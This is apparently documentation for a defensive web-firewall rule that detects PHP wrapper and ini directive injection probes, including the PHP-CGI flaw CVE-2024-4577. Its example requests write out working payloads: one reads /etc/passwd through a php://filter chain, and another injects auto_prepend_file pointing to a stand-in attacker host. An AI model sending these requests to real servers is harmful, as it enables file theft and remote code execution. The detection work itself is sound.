AppSec rule detecting PHP wrapper spawning and ini directive injection probes.

Inspecting the full URI (URL-decoded, case-insensitive) and multipart argument
names for:

- `php://filter`, `php://input` (and the URL-encoded forms) - LFI filter chains
- `auto_prepend_file`, `allow_url_include` - ini directive injection
- `PHP_VALUE`, `php_admin_value` - FastCGI param injection
- `/cgi-bin/php`, `%AD%AD` - PHP-CGI argument injection (CVE-2024-4577)

## Examples

```http
GET /index.php?p=php://filter/read=convert.base64-encode/resource=../../etc/passwd HTTP/1.1
GET /index.php?auto_prepend_file=data:text/plain;base64,xxx HTTP/1.1
POST /cgi-bin/php-cgi?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dhttp://evil.example/x HTTP/1.1
```

Intended to be evaluated with an in-band remediation of `ban`; scanners send
these constantly, and real requests never contain ini directive names.
